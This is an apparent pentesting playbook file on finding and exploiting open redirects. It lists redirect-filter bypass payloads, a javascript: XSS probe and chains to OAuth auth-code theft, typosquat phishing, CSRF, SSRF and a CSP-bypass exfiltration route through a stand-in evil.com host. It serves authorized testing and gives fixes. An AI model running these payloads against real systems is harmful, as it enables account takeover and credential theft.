---
slug: open-redirect
applies_to: [pentester]
owasp: A01
related: [ssrf, xss, authentication_jwt]
---

# Open Redirect — Pentester Playbook

> Load this when recon found any endpoint that takes a URL/path parameter
> and redirects to it: login post-redirect (`?next=`, `?return_to=`),
> OAuth `redirect_uri`, generic `?url=` proxies, link-tracking
> middlewares.

## When to load this

Open redirects are common, low-severity on their own, but become high-impact when chained. Hunt them in:

- Login flows: `?return_to=`, `?next=`, `?redirect=`, `?continue=`, `?destination=`
- OAuth / SSO: `?redirect_uri=`, `?callback=`, `?return=`
- Email tracking links: `https://target.com/click?url=https://campaign.target.com/x`
- "Continue to checkout" / "Resume your session" workflows
- 404 handlers that redirect to homepage with `?from=` for analytics
- Logout endpoints that redirect after logout
- File-download endpoints that 302 to a CDN URL

The chained-attack potential is highest against:

- OAuth flows (chain → auth code theft → account takeover)
- Email-quoted URLs (the target domain in the URL is what the victim trusts)
- Apps with cookie-bound SameSite-Strict sessions (the redirect carries the trust)

## What you're looking for

Three primary shapes:

- **Full external redirect.** `?next=https://attacker.com/` redirects to attacker host. Bare-bones open redirect.
- **Protocol-confusion redirect.** `?next=//attacker.com/` (protocol-relative URL — browsers interpret as `https://attacker.com/`). Common bypass against filters that check for `http://`.
- **Path-only redirect that backreflects.** `?next=/admin/dashboard` is allowed (path-only), but `?next=/\\attacker.com/` is interpreted as a network-path reference by some browsers.

## First moves

1. **Naked test.** Replace the redirect target with your attacker domain. `https://target.com/login?next=https://evil.com/`. Submit the request. Check the response — if you get a `Location: https://evil.com/` header (302/301/307/308), open redirect confirmed.

2. **Protocol-relative test.** `?next=//evil.com/`. If accepted, the filter is checking for `http://` literally and missing the protocol-relative form.

3. **Path-traversal test.** `?next=/redirect-to-anywhere`, `?next=/static/../external/...`, `?next=/\\evil.com/path`. Different parsers interpret these differently.

4. **Userinfo trick.** `?next=https://target.com@evil.com/`. URL parser sees `target.com` as userinfo (= allowed origin), browser navigates to `evil.com`.

5. **Whitelist bypass via wildcard.** If filter allows `*.target.com`, try `?next=https://target.com.evil.com/`. Filter passes (host ends with `.target.com`), browser goes to `evil.com` subdomain.

6. **Encoded variants.** URL-encoded slashes (`%2F`), CRLF injection (`%0D%0A`), double-encoding. Test each individually — different gateways decode at different layers.

7. **JavaScript scheme.** `?next=javascript:alert(1)`. If the redirect ends up in a `window.location.href = userInput` JS sink, this is XSS, not just open redirect.

## Confirming a hit

The proof is the redirect target — verify with a real browser, not just curl:

- **Curl follow-redirect.** `curl -sIL "https://target.com/login?next=https://evil.com/"`. Check the chain of `Location` headers. If the last hop is `evil.com`, confirmed.
- **Browser test.** Visit the URL in a real browser. Watch the address bar — does it actually leave the target's origin? If yes, confirmed.
- **Don't trust the response body.** Some apps render a "redirecting…" page with a JS redirect. The body may show the intended destination but JS may have safety logic that doesn't execute. Browser test is canonical.

## Going deeper — by chain

### OAuth token theft
The high-value chain. OAuth flow:
1. User clicks "Login with Google" → app sends them to Google with `redirect_uri=https://app.target.com/callback`
2. Google authenticates, redirects to `https://app.target.com/callback?code=AUTH_CODE`
3. App exchanges `code` for an access token

If you can manipulate `redirect_uri` (open redirect within the OAuth flow):
1. Send the victim a link: `https://app.target.com/oauth/start?redirect_uri=https://evil.com/callback`
2. Victim authenticates with Google (their normal flow)
3. Google redirects to `evil.com/callback?code=AUTH_CODE`
4. You take their auth code and complete the OAuth flow yourself, logging in as them

This requires the OAuth provider to also accept the manipulated `redirect_uri` — typically the provider has a registered list, but wildcard subdomain registrations are common and exploitable.

### Phishing
- Send victim `https://legit-target.com/login?return_to=https://evil-target.com/login` (where `evil-target.com` is a typosquat).
- Victim sees the legit domain in the link, clicks, gets redirected to the typosquat.
- Typosquat shows a clone of the login page; victim re-enters credentials.

### CSRF helper
Some apps block CSRF by requiring `Referer: https://target.com/...`. If the attacker has an open redirect, the attacker page can redirect through the target → CSRF endpoint → both bypassing `Referer` AND riding the user's cookie.

### Stored CSP bypass
If your XSS payload would violate CSP because it has to call out to an external domain, an open redirect lets the call go to `target.com/redirect?to=evil.com/exfil`. The browser fetches `target.com` (passes CSP), then redirects to your exfil endpoint (browser follows because the redirect is from a CSP-allowed origin).

## When filters get in the way

- **Hostname allowlist.** Try `?next=https://target.com.evil.com/` (suffix match bypass), `?next=https://evil.com/?target.com` (prefix match bypass), `?next=https://target%2ecom@evil.com/` (URL parser confusion).
- **`http://` blocked.** Try `//evil.com`, `https://evil.com`, `\\\\evil.com`, `//\\evil.com`, `https:evil.com` (missing slashes — some parsers treat as relative).
- **Domain in body but not URL.** Some apps redirect based on POST body, not query string. Hit the same endpoint with POST.
- **JavaScript-side redirect.** App reads `?next=` from URL, validates server-side, then JS does the redirect. If JS uses a different parsing routine, you can sometimes bypass server validation.
- **`Referer`-based redirect.** App redirects to the Referer header on certain endpoints. Set `Referer: https://evil.com` from your attacker page.

## Escalation paths

1. **Account takeover via OAuth.** The OAuth chain above.
2. **Account takeover via login-flow tampering.** Some login flows leak the session cookie in the redirect URL fragment.
3. **Authority hijack.** Use the target's trust to bounce victims to fake content (phishing, malware download, fake update prompts).
4. **Open-redirect → SSRF.** If the open redirect feeds an internal fetcher (link previewer, PDF generator that fetches images), you've turned open-redirect into SSRF by chaining: app fetches `attacker.com/redirect?to=internal-api`, follows the redirect, makes the internal request.
5. **CSP bypass for stored XSS.** As above — exfil through an allowed origin's redirect endpoint.

## What a real finding looks like

- The URL with the manipulated redirect parameter
- The HTTP response showing `Location: https://evil-domain` or equivalent
- A screen recording of the actual browser behavior (especially important if the redirect happens via JS rather than HTTP header)
- The chained scenario you're escalating to (if any) — OAuth token theft repro is worth 10x a bare open redirect report
- The fix: allowlist with exact hostname matching (not suffix/prefix), reject protocol-relative URLs, reject `javascript:`/`data:` schemes, log redirects to flag the attempts

## Common false positives

- **Server-side redirect to a hardcoded domain.** App ignores your `?next=` and always redirects to dashboard. Confirm by varying the parameter and watching `Location` header.
- **Redirect via JS that gets blocked by browser.** Modern browsers block some unsafe redirects. The HTTP response shows the redirect, but the browser refuses. Still a finding (server-side bug), lower severity for direct phishing, still chainable for OAuth.
- **Redirect to a path on the same domain.** `?next=/admin` redirects to `https://target.com/admin`. Not an open redirect — staying on origin.
- **Redirect target reflects but isn't followed.** App echoes `?next=evil.com` in the page but actually redirects to homepage. Reflection ≠ redirect.

## Related skills

`ssrf` for the open-redirect-to-SSRF chain, `xss` for the chained CSP bypass, `authentication_jwt` for the OAuth flow context.
